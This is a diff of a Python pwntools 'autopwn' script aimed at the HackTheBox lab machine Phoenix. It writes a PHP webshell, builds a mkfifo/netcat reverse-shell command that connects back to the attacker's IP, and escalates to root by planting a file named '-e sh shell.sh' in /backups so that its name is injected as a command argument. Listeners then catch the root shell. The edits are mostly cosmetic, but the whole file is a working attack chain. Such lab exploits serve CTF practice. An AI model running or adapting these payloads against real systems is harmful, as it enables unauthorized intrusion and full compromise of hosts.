@@ -1,7 +1,7 @@
 try:
     from pwn import *
     os.system("echo '10.10.11.149 phoenix.htb' >> /etc/hosts")
-    print("\n[\033[1;32m+\033[1;37m] Autopwn Name ~ GatoGamer1155\n")
+    print("\n[\033[1;32m+\033[1;37m] Autopwn Phoenix ~ GatoGamer1155\n")
 except:
     print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
     exit(1)
@@ -17,7 +17,7 @@ os.system("echo '%s' > cmd.phtml" % (cmdphp))
 os.system("echo '10.10.11.149 phoenix.htb' >> /etc/hosts")
 
 if len(sys.argv) < 2:
-    print(f"\n[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <ip>\n")
+    print(f"[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <ip>\n")
     exit(1)
 
 ip = sys.argv[1]
@@ -35,7 +35,7 @@ def cmd():
 
 def sher():
     threading.Thread(target=cmd, args=()).start()
-    revs = f"bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} 4444 >/tmp/f'"
+    revs = f"bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} 4444 >/tmp/f'"
     shellroot = f'cd /backups; touch -- "-e sh shell.sh"; chmod +x -- "-e sh shell.sh"; echo "%s" > shell.sh; chmod +x shell.sh' % (revs)
     shell = listen(9001, timeout=90).wait_for_connection()
     shell.sendline(b"script /dev/null -c bash")
@@ -50,4 +50,5 @@ def sher():
 threading.Thread(target=sher, args=()).start()
 print("[\033[1;34m*\033[1;37m] Esto puede tardar de 3 a 7 minutos\n")
 root = listen(4444, timeout=410).wait_for_connection()
+root.sendline(b"export TERM=xterm; cd")
 root.interactive()
